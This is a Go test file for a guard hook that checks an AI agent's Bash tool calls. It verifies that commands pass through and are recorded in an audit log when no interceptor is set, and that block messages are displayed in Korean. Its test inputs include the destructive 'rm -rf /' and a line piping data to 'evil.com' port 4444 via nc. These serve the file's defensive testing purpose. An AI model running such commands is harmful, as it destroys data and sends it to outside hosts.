package guard

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

// 원본 탐지 마커와 플랫폼 차단 의미를 유지하고 API 표시는 한국어로 제공한다.
func TestSystemBlockMessageKoreanDisplay(t *testing.T) {
	got := systemBlockMessage("[模型] 테스트 사유")
	if !strings.HasPrefix(got, platformBlockMarker) || !strings.Contains(got, "대상 시스템의 방어가 아닌 플랫폼 정책") {
		t.Fatalf("missing platform framing: %q", got)
	}
	g := New()
	g.block("Bash", got, "")
	shown := g.Audit()[0].Reason
	if strings.Contains(shown, platformBlockMarker) || strings.Contains(shown, "[模型]") || !strings.Contains(shown, "[모델] 테스트 사유") || shown != DisplayMessage(got) {
		t.Fatalf("invalid display: %q", shown)
	}
	if g.audit[0].Reason != got || DisplayMessage("HTTP/1.1 403 Forbidden [模型]") != "HTTP/1.1 403 Forbidden [模型]" {
		t.Fatal("raw audit or target evidence was changed")
	}
	if DisplayMessage("Blocked by hook: "+got) != shown {
		t.Fatal("SDK hook wrapper bypassed display translation")
	}
}

var _ = hook.PreToolUse
